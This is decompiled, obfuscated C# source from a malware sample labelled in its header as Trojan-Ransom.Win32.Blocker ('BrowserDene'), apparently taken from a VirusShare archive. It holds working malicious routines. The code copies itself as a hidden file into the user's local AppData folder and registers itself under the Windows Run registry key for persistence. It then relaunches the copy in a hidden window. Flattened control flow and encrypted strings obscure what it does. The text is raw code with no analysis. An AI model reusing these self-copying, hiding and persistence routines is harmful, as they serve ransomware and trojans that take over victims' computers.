// Decompiled with JetBrains decompiler
// Type: BrowserDene.Utils
// Assembly: BrowserDene, Version=1.2.0.5, Culture=neutral, PublicKeyToken=null
// MVID: DAE765B5-201F-4D65-9BED-4F0B91589302
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.idvu-6362b7c005f41b3bc001ea9d0994a00a54032c537684b29d2e35df2528a469a0.exe

using eJnHnFFEpEmlCQmkVB;
using eYO1TM7iGlKLL86lCw;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

namespace BrowserDene
{
  internal class Utils
  {
    private const string RegKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    private const int FEATURE_DISABLE_NAVIGATION_SOUNDS = 21;
    private const int SET_FEATURE_ON_PROCESS = 2;
    public static object Regkeyname;
    public static object DstName;

    [DllImport("urlmon.dll")]
    [return: MarshalAs(UnmanagedType.Error)]
    private static extern int CoInternetSetFeatureEnabled(
      int FeatureEntry,
      [MarshalAs(UnmanagedType.U4)] int dwFlags,
      bool fEnable);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void DisableClickSounds() => Utils.CoInternetSetFeatureEnabled(21, 2, true);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void Copy(object src, object dst)
    {
      Utils.H2dYEwd1n56oJSEl9aY();
      int num = Utils.RxmNEsdXfs9RS61D2l8() ? 4 : 3;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 3:
            if (!Utils.aih9Pdd8Z7KShG3kmwc(dst))
              goto case 2;
            else
              goto case 1;
          case 1:
          case 4:
            Utils.kM3mM6dpeVxxV2waOqT(dst, FileAttributes.Normal);
            goto case 2;
          case 2:
            try
            {
              Utils.zaND92d2Kjx0SDxt1KA(src, dst, true);
            }
            catch (Exception ex)
            {
            }
            Utils.kM3mM6dpeVxxV2waOqT(dst, FileAttributes.Hidden);
            num = 5;
            continue;
          case 5:
            goto label_8;
          default:
            num = 2;
            continue;
        }
      }
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void Startup(object name, object path)
    {
      Utils.RxmNEsdXfs9RS61D2l8();
      int num;
      if (Utils.H2dYEwd1n56oJSEl9aY())
        num = 3;
      else
        goto label_11;
label_6:
      RegistryKey registryKey;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 3:
            registryKey = (RegistryKey) Utils.AkLmOGdWeS5ZVW6tC44((object) Registry.CurrentUser, (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(1470), true);
            goto case 1;
          case 1:
          case 2:
            if (registryKey == null)
            {
              num = 4;
              continue;
            }
            Utils.OthNTqd3io87vK2Odu6((object) registryKey, name, path);
            goto case 5;
          case 4:
            goto label_10;
          case 5:
            Utils.ibvuPTd5mWVxSY7HLPy((object) registryKey);
            num = 6;
            continue;
          case 6:
            goto label_4;
          default:
            if (true)
            {
              num = 5;
              continue;
            }
            goto case 5;
        }
      }
label_10:
      return;
label_4:
      return;
label_11:
      num = 2;
      if (Utils.H2dYEwd1n56oJSEl9aY())
        goto label_6;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void DstCheck()
    {
      int num1 = 6;
      if (true)
        goto label_5;
label_1:
      string str1;
      string str2;
      if (Utils.yE2dwmdlW6bYyD2jObM(Utils.AbZPaUdjhdOhJ1V8RtA((object) str1), (object) str2))
      {
        num1 = 0;
      }
      else
      {
        Utils.LwT8wUd7RWkuu4SjRcp((object) str1, Utils.qZQWeZdocLYAVuV196q((object) str2, (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(1564), Utils.DstName));
        int num2 = 4;
        num1 = Utils.RxmNEsdXfs9RS61D2l8() ? num2 : num2;
      }
label_5:
      ProcessStartInfo processStartInfo;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_14;
          case 1:
            str2 = (string) Utils.LyWXBFd41jbL5sKVOoh(Environment.SpecialFolder.LocalApplicationData);
            Utils.RxmNEsdXfs9RS61D2l8();
            num1 = !Utils.H2dYEwd1n56oJSEl9aY() ? 9 : 3;
            continue;
          case 2:
          case 3:
            goto label_1;
          case 4:
            Utils.eG3rjtdN6WJYW4yYOE6(Program.AppMutex);
            goto case 10;
          case 5:
            Utils.OUkuG4d0uIOU86SK5kM((object) processStartInfo, true);
            if (true)
            {
              num1 = 11;
              continue;
            }
            goto case 8;
          case 6:
            str1 = (string) Utils.LkOHULd9JSVNhVY2YxE(Utils.KgQVK5dbVWiRgF7uV1u());
            int num3 = 1;
            num1 = Utils.RxmNEsdXfs9RS61D2l8() ? num3 : num3;
            continue;
          case 7:
          case 9:
            Utils.EFMKQpdG38h1rlhaC3W((object) processStartInfo, ProcessWindowStyle.Hidden);
            num1 = 5;
            continue;
          case 8:
            Utils.mEVB33duuQ4GrcqnirK((object) processStartInfo, false);
            goto case 7;
          case 10:
            processStartInfo = new ProcessStartInfo((string) Utils.qZQWeZdocLYAVuV196q((object) str2, (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(1570), Utils.DstName));
            num1 = 8;
            continue;
          case 11:
            goto label_12;
          default:
            num1 = 10;
            continue;
        }
      }
label_14:
      return;
label_12:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Utils()
    {
      Utils.t1CWb1dcCasqABnM6k0();
      Utils.LBxahddeyxdGn6IWJxP((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    static Utils()
    {
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 0:
            Utils.t1CWb1dcCasqABnM6k0();
            Utils.RxmNEsdXfs9RS61D2l8();
            if (Utils.H2dYEwd1n56oJSEl9aY())
            {
              if (true)
              {
                num = 4;
                continue;
              }
              goto case 1;
            }
            else
            {
              num = 3;
              continue;
            }
          case 1:
          case 4:
            Utils.Regkeyname = (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(1576);
            break;
          case 5:
            goto label_5;
        }
        Utils.DstName = (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(1602);
        num = 5;
      }
label_5:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool H2dYEwd1n56oJSEl9aY() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool RxmNEsdXfs9RS61D2l8() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool aih9Pdd8Z7KShG3kmwc([In] object obj0) => File.Exists((string) obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void kM3mM6dpeVxxV2waOqT([In] object obj0, [In] FileAttributes obj1) => File.SetAttributes((string) obj0, obj1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void zaND92d2Kjx0SDxt1KA([In] object obj0, [In] object obj1, [In] bool obj2) => File.Copy((string) obj0, (string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object AkLmOGdWeS5ZVW6tC44([In] object obj0, [In] object obj1, [In] bool obj2) => (object) ((RegistryKey) obj0).OpenSubKey((string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void OthNTqd3io87vK2Odu6([In] object obj0, [In] object obj1, [In] object obj2) => ((RegistryKey) obj0).SetValue((string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void ibvuPTd5mWVxSY7HLPy([In] object obj0) => ((RegistryKey) obj0).Close();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object KgQVK5dbVWiRgF7uV1u() => (object) Assembly.GetExecutingAssembly();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object LkOHULd9JSVNhVY2YxE([In] object obj0) => (object) ((Assembly) obj0).Location;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object LyWXBFd41jbL5sKVOoh([In] Environment.SpecialFolder obj0) => (object) Environment.GetFolderPath(obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object AbZPaUdjhdOhJ1V8RtA([In] object obj0) => (object) Path.GetDirectoryName((string) obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool yE2dwmdlW6bYyD2jObM([In] object obj0, [In] object obj1) => (string) obj0 == (string) obj1;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object qZQWeZdocLYAVuV196q([In] object obj0, [In] object obj1, [In] object obj2) => (object) ((string) obj0 + (string) obj1 + (string) obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void LwT8wUd7RWkuu4SjRcp([In] object obj0, [In] object obj1) => Utils.Copy(obj0, obj1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void eG3rjtdN6WJYW4yYOE6([In] object obj0) => ((Mutex) obj0).ReleaseMutex();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void mEVB33duuQ4GrcqnirK([In] object obj0, [In] bool obj1) => ((ProcessStartInfo) obj0).RedirectStandardOutput = obj1;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void EFMKQpdG38h1rlhaC3W([In] object obj0, [In] ProcessWindowStyle obj1) => ((ProcessStartInfo) obj0).WindowStyle = obj1;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void OUkuG4d0uIOU86SK5kM([In] object obj0, [In] bool obj1) => ((ProcessStartInfo) obj0).UseShellExecute = obj1;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void t1CWb1dcCasqABnM6k0() => eWK97ZHZd8El3E8K9m.CCaDPjJzSd0Mj();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void LBxahddeyxdGn6IWJxP([In] object obj0) => obj0.\u002Ector();
  }
}
